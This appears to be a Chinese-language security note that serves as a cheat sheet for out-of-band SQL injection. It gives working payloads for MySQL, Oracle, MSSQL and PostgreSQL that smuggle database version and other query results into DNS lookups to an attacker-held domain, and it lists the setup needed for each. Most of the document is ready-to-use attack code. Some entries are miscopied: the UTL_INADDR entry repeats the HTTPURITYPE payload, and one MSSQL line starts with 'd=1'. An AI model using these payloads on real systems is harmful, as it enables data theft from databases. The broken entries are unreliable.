# SQL 注入信息外带（OOB）
SQL注入时候，利用特定函数，将查询结果拼接到DNS协议请求中，带出来，从而实现回显的命令注入漏洞利用。  

## 0x01 前期准备
我们需要一个三级域名服务器（nameserver）也是DNS服务器（DNS Server）：   
1. dnslog  http://www.dnslog.cn/
2. 自己搭建个DNS服务器和购买域名  

## 0x02 漏洞利用
re111.dnslog.cn 是你拥有的三级域名。    
### 2.1 MySQL
#### 2.1.1 条件
- Windows
- mysql.ini 中 secure_file_priv 必须为空，select @@secure_file_priv
- 适用于联合注入或堆叠注入
#### 2.1.2 利用
利用 mysql 中的 load_file() 函数，借助了Windows UNC路径特性。   
```
select load_file(concat("\\\\",version(),".re111.dnslog.cn//1ndex.txt"));
```
### 2.2 oracle
#### 2.2.1 条件
- 适用于联合注入或堆叠注入
#### 2.2.2 利用

UTL_HTTP.REQUEST()
```
SELECT UTL_HTTP.REQUEST((SELECT * from v$version)||'.re111.dnslog.cn') FROM sys.DUAL;
```
DBMS_LDAP.INIT()
```
SELECT DBMS_LDAP.INIT((SELECT * from v$version)||'.re111.dnslog.cn',80) FROM sys.DUAL;
```
HTTPURITYPE()
```
SELECT HTTPURITYPE((SELECT * from v$version)||'.re111.dnslog.cn').GETCLOB() FROM sys.DUAL;
```
UTL_INADDR.GET_HOST_ADDRESS()
```
SELECT HTTPURITYPE((SELECT * from v$version)||'.re111.dnslog.cn').GETCLOB() FROM sys.DUAL;
```

### 2.3 mssql
#### 2.3.1 条件
- Winodows
- 适用于联合注入或堆叠注入
#### 2.3.2 利用
原理跟mysql利用一致。    
```
d=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))%2b'.re111.dnslog.cn'; EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"'); 
```
```
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))%2b'.re111.dnslog.cn'; EXEC('master..xp_fileexist "\'%2b@host%2b'\foobar$"'); 
```
```
id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT SERVERPROPERTY('edition'))%2b'.re111.dnslog.cn'; EXEC('master..xp_subdirs "\'%2b@host%2b'\foobar$"');
```
### 2.4 postgreSQL
#### 2.4.1 条件
- Windows
- 适用于堆叠注入

```
id=1;DROP TABLE IF EXISTS table_output; CREATE TABLE table_output(content text); CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT; DECLARE query_result TEXT; BEGIN SELECT INTO query_result (select version()); exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.re111.dnslog.cn\\\\aaa.txt\''; EXECUTE exec_cmd; END; $$ LANGUAGE plpgSQL SECURITY DEFINER; SELECT temp_function(); 
```
开启 db_link 扩展：

```
id=1;CREATE EXTENSION dblink;SELECT * FROM dblink('host='||(SELECT version())||'.re111.dnslog.cn username=1ndex password=1ndex','SELECT 1ndex') RETURNS (result TEXT); 
```

## Ref
- https://www.cnblogs.com/wjrblogs/p/14367387.html
